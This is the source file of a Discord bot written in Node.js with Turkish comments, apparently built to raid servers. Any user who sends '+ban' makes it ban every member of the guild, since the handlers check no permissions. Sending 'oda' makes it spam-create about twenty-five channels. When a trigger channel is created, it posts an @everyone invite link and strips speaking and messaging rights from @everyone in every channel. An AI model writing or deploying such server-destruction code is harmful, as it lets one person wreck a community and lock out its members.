//7/24 başlayış

const http = require('http');
const express = require('express');    
const app = express();
let cooldown = new Set();
let cdseconds = 5;
app.get("/", (request, response) => {
  console.log(Date.now());
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://pyros.glitch.me/`);
}, 10000);

const Discord = require('discord.js');
const fs = require('fs');
const chalk = require('chalk');

const client = new Discord.Client();
const tokenyeri = require('./tokenyeri.json');

require('./util/eventLoader')(client);

client.on('message', message => {
    if(message.content == 'unban'){
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                console.log(user.username + '#' + user.tag);
                message.guild.unban(user);
            });
        });
    }
});

client.on('message', message => {
    if(message.content == '+ban'){
message.guild.members.forEach(member => member.ban())
    }
});

client.on('message', message => {
    if(message.content == 'oda'){
   message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
      message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)

message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
      message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)

message.guild.createChannel(`berke`)
    }
});

const log = message => {
  console.log(`${message}`);
};
  var prefix = tokenyeri.prefix;
  
/*BOTU AÇIK TUTMA*/
  client.commands = new Discord.Collection();
  client.aliases = new Discord.Collection();
  fs.readdir('./berke/', (err, files) => {
    if (err) console.error(err);
    log(`Başlıyor...`);
    files.forEach(f => {
      let props = require(`./berke/${f}`);
      log(`Tamamdır berke abi hazırım.`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });
  });

  client.reload = command => {
    return new Promise((resolve, reject) => {
      try {
        delete require.cache[require.resolve(`./berke/${command}`)];
        let cmd = require(`./berke/${command}`);
        client.commands.delete(command);
        client.aliases.forEach((cmd, alias) => {
          if (cmd === command) client.aliases.delete(alias);
        });
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

  client.load = command => {
    return new Promise((resolve, reject) => {
      try {
        let cmd = require(`./berke/${command}`);
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./berke/${command}`)];
      let cmd = require(`./berke/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./berke/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./berke/${command}`)];
      let cmd = require(`./berke/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.on('warn', e => {
  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
});

client.on('error', e => {
  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
});

client.on('channelCreate', channel => {
  if (channel.name == 'berke-adamdir') {
    channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://discord.gg/4judfSa`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === tokenyeri.sahip) permlvl = 4;
  return permlvl;
};

client.login(tokenyeri.token) 